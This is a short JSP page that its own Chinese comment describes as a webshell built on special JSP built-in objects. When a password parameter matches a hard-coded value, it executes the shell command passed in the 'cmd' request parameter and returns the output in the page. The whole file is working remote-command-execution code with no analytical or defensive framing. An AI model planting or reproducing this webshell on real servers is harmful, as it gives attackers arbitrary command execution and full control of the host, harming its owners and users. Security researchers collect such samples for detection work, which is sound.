<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--使用一些特殊的JSP内置对象实现的webshell--%>
<%
    if ("shaqima".equals(_jspx_page_context.getRequest().getParameter("ladypwd"))) {
        InputStream in = Runtime.getRuntime().exec(_jspx_page_context.getRequest().getParameter("cmd").split(" ")).getInputStream();
        int ret = -1;
        byte[] bs = new byte[2048];
        out.print("<pre>");
        while((ret = in.read(bs)) != -1) {
            out.println(new String(bs));
        }
        out.print("</pre>");
    }
%>


